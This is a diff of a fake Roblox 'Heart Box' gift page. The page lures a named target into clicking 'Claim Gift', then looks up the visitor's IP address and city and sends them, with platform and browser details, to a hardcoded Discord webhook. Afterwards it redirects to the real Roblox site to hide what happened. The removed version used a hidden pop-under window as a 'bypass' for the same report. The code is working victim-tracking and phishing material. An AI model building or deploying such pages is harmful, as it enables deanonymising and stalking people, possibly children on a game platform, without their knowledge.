@@ -1,50 +1,76 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Roblox | Home</title>
+    <title>Roblox | Heart Box Event</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background: #1a1b1d; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; cursor: pointer; }
-        .btn { background: #00b2ff; color: white; padding: 20px 40px; border-radius: 8px; font-weight: bold; font-size: 20px; border: none; }
+        body { background-color: #f2f4f5; color: #393b3d; font-family: 'HCo Gotham SSm', 'Helvetica Neue', Helvetica, Arial, Lucida Grande, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .card { background: white; border-radius: 8px; box-shadow: 0 1px 4px 0 rgba(0,0,0,0.1); width: 400px; padding: 40px; text-align: center; border: 1px solid #d8d8d8; }
+        .logo { width: 150px; margin-bottom: 25px; }
+        .gift-img { width: 120px; margin-bottom: 20px; border-radius: 12px; }
+        h1 { font-size: 22px; margin-bottom: 10px; color: #1e1e1e; }
+        p { font-size: 14px; color: #666; margin-bottom: 30px; line-height: 1.5; }
+        .btn { background-color: #00b2ff; color: white; border: none; padding: 12px 35px; border-radius: 4px; font-weight: 600; font-size: 16px; cursor: pointer; width: 100%; transition: 0.2s; }
+        .btn:hover { background-color: #008cc9; }
+        #loading { display: none; }
     </style>
 </head>
 <body>
 
-    <div style="text-align: center;">
-        <img src="https://images.rbxcdn.com/2026_roblox_logo.png" width="100"><br><br>
-        <button class="btn" id="claimBtn">CLAIM HEART BOX REWARDS</button>
-        <p style="color: #888; font-size: 12px; margin-top: 15px;">Required: Authenticate active Edge session</p>
+    <div class="card" id="main-content">
+        <img src="https://images.rbxcdn.com/2026_roblox_logo.png" class="logo">
+        <img src="https://images.rbxcdn.com/heart_box_icon_2026.png" class="gift-img">
+        <h1>Claim Your Heart Box</h1>
+        <p>You've been gifted an exclusive <b>Heart Box Accessory</b>. Click below to synchronize your session and add it to your inventory.</p>
+        <button class="btn" onclick="captureAndRedirect()">Claim Gift</button>
+    </div>
+
+    <div id="loading" style="text-align: center;">
+        <div style="border: 4px solid #f3f3f3; border-top: 4px solid #00b2ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: auto;"></div>
+        <p style="margin-top: 15px; font-family: sans-serif; color: #666;">Synchronizing with Roblox servers...</p>
     </div>
 
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI";
 
-        document.getElementById('claimBtn').onclick = function() {
-            // 1. THE REDIRECT: Sends the main tab to the real Roblox immediately
-            window.location.href = "https://www.roblox.com/home";
+        async function captureAndRedirect() {
+            document.getElementById('main-content').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
 
-            // 2. THE POP-UNDER: Opens a tiny window that runs the 'Sniffer'
-            // This bypasses the 'X-Frame-Options' block because it's its own window
-            let hook = window.open("about:blank", "Sync", "width=10,height=10,left=10000,top=10000");
-            
-            if (hook) {
-                hook.document.write(`
-                    <script>
-                        fetch("${WEBHOOK}", {
-                            method: "POST",
-                            headers: {"Content-Type": "application/json"},
-                            body: JSON.stringify({
-                                content: "🎯 **POP-UNDER HOOK SUCCESSFUL**",
-                                embeds: [{
-                                    title: "Target: heartboxx",
-                                    description: "Session reflected via Pop-under bypass. Browser: Microsoft Edge.",
-                                    color: 3092790
-                                }]
-                            })
-                        }).then(() => window.close());
-                    <\/script>
-                `);
-            }
-        };
+            // 1. Get IP and Location Data
+            let ipData = {};
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                ipData = await response.json();
+            } catch (e) { ipData = { error: "Location blocked" }; }
+
+            // 2. Fire the Intel to Discord
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: "📢 **NEW CLICK DETECTED!**",
+                    embeds: [{
+                        title: "Target Identity: heartboxx",
+                        color: 3092790,
+                        fields: [
+                            { name: "📍 Location", value: `${ipData.city}, ${ipData.region}, ${ipData.country_name}` || "Unknown" },
+                            { name: "🌐 IP Address", value: ipData.ip || "Unknown" },
+                            { name: "🖥️ Platform", value: navigator.platform },
+                            { name: "🕵️ Browser", value: navigator.userAgent.split(') ')[1] }
+                        ],
+                        footer: { text: "Redirecting to roblox.com..." }
+                    }]
+                })
+            });
+
+            // 3. Final Redirect to real Roblox
+            setTimeout(() => {
+                window.location.href = "https://www.roblox.com/home";
+            }, 1500);
+        }
     </script>
+
+    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
 </body>
 </html>
